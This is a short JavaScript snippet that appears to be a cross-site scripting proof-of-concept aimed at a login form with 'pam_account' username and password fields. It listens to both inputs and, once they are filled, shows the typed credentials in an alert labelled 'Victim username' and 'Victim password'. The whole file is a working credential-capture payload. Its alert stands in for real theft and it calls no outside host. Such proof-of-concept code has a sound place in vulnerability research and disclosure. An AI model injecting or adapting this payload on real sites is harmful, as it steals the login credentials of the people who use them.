let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('pam_account[login_name]')[0];
    const input2 = document.getElementsByName('pam_account[login_password]')[0];

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim username: '+document.getElementsByName('pam_account[login_name]')[0].value+'\n\nVictim password: '+document.getElementsByName('pam_account[login_password]')[0].value);
         
        }, 4500); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('pam_account[login_name]')[0].addEventListener('input', checkInputs);
  document.getElementsByName('pam_account[login_password]')[0].addEventListener('input', checkInputs);
